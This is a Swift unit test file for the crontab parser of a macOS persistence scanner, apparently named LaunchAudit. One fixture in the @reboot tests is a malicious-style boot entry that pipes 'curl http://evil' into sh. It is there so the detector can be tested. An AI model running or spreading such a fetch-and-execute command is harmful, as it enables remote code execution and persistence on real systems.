import XCTest
@testable import LaunchAudit

/// Tests for crontab parsing.
///
/// Covers the two bugs that made this scanner miss or mangle its primary targets:
/// `@reboot` entries were discarded by a six-field minimum, and `/etc/crontab`'s
/// user column was parsed as the executable.
final class CronScannerTests: XCTestCase {

    private let scanner = CronScanner()

    // MARK: - @reboot

    func testParsesRebootEntry() {
        // `@reboot /usr/local/bin/payload` is two tokens. The old `parts.count >= 6`
        // guard rejected it before the `@` branch was ever reached — silently
        // dropping the primary cron persistence vector.
        let items = scanner.parseCrontab(
            "@reboot /usr/local/bin/payload\n", owner: .user("alice")
        )
        XCTAssertEqual(items.count, 1)
        let item = try? XCTUnwrap(items.first)
        XCTAssertEqual(item?.executablePath, "/usr/local/bin/payload")
        XCTAssertEqual(item?.runContext, .boot)
        XCTAssertEqual(item?.rawMetadata["Schedule"]?.stringValue, "@reboot")
    }

    func testParsesRebootEntryWithArguments() {
        let items = scanner.parseCrontab(
            "@reboot /bin/sh -c 'curl http://evil | sh'\n", owner: .system
        )
        XCTAssertEqual(items.count, 1)
        XCTAssertEqual(items.first?.executablePath, "/bin/sh")
        XCTAssertEqual(items.first?.runContext, .boot)
    }

    func testParsesOtherSpecialSchedules() {
        for keyword in ["@daily", "@weekly", "@monthly", "@hourly", "@yearly"] {
            let items = scanner.parseCrontab("\(keyword) /usr/bin/true\n", owner: .system)
            XCTAssertEqual(items.count, 1, "\(keyword) should produce an item")
            XCTAssertEqual(items.first?.runContext, .scheduled)
        }
    }

    // MARK: - Standard five-field form

    func testParsesFiveFieldEntry() {
        let items = scanner.parseCrontab(
            "0 3 * * * /usr/local/bin/backup --full\n", owner: .user("bob")
        )
        XCTAssertEqual(items.count, 1)
        XCTAssertEqual(items.first?.executablePath, "/usr/local/bin/backup")
        XCTAssertEqual(items.first?.arguments, ["/usr/local/bin/backup", "--full"])
        XCTAssertEqual(items.first?.rawMetadata["Schedule"]?.stringValue, "0 3 * * *")
        XCTAssertEqual(items.first?.runContext, .scheduled)
    }

    // MARK: - /etc/crontab six-field form

    func testSystemCrontabUserColumnIsNotTreatedAsExecutable() {
        // `/etc/crontab` inserts a user column between schedule and command
        // (man 5 crontab). Without `hasUserField` the executable came back as
        // "root" and every argument was shifted by one.
        let items = scanner.parseCrontab(
            "0 3 * * * root /usr/sbin/periodic daily\n",
            owner: .system,
            configPath: "/etc/crontab",
            hasUserField: true
        )
        XCTAssertEqual(items.count, 1)
        let item = try? XCTUnwrap(items.first)
        XCTAssertEqual(item?.executablePath, "/usr/sbin/periodic")
        XCTAssertNotEqual(item?.executablePath, "root")
        XCTAssertEqual(item?.arguments, ["/usr/sbin/periodic", "daily"])
        XCTAssertEqual(item?.rawMetadata["RunAsUser"]?.stringValue, "root")
    }

    func testSystemCrontabAttributesNonRootUserCorrectly() {
        let items = scanner.parseCrontab(
            "*/5 * * * * alice /Users/alice/bin/sync\n",
            owner: .system,
            configPath: "/etc/crontab",
            hasUserField: true
        )
        XCTAssertEqual(items.first?.owner, .user("alice"))
        XCTAssertEqual(items.first?.executablePath, "/Users/alice/bin/sync")
    }

    func testSystemCrontabRebootEntryWithUserColumn() {
        let items = scanner.parseCrontab(
            "@reboot root /usr/local/bin/start\n",
            owner: .system,
            configPath: "/etc/crontab",
            hasUserField: true
        )
        XCTAssertEqual(items.count, 1)
        XCTAssertEqual(items.first?.executablePath, "/usr/local/bin/start")
        XCTAssertEqual(items.first?.runContext, .boot)
    }

    // MARK: - Things that are not jobs

    func testSkipsCommentsBlankLinesAndAssignments() {
        let content = """
        # a comment
        \n
        SHELL=/bin/sh
        PATH=/usr/bin:/bin
        MAILTO=""
        """
        XCTAssertTrue(scanner.parseCrontab(content, owner: .system).isEmpty)
    }

    func testSkipsIncompleteLines() {
        // A schedule with no command is not a job.
        XCTAssertTrue(scanner.parseCrontab("0 3 * * *\n", owner: .system).isEmpty)
        XCTAssertTrue(scanner.parseCrontab("@reboot\n", owner: .system).isEmpty)
    }

    func testHandlesMixedContent() {
        let content = """
        # header
        SHELL=/bin/zsh
        @reboot /usr/local/bin/one
        0 0 * * * /usr/local/bin/two

        */10 * * * * /usr/local/bin/three
        """
        let items = scanner.parseCrontab(content, owner: .user("alice"))
        XCTAssertEqual(items.count, 3)
        XCTAssertEqual(items.map(\.executablePath), [
            "/usr/local/bin/one", "/usr/local/bin/two", "/usr/local/bin/three",
        ])
    }
}
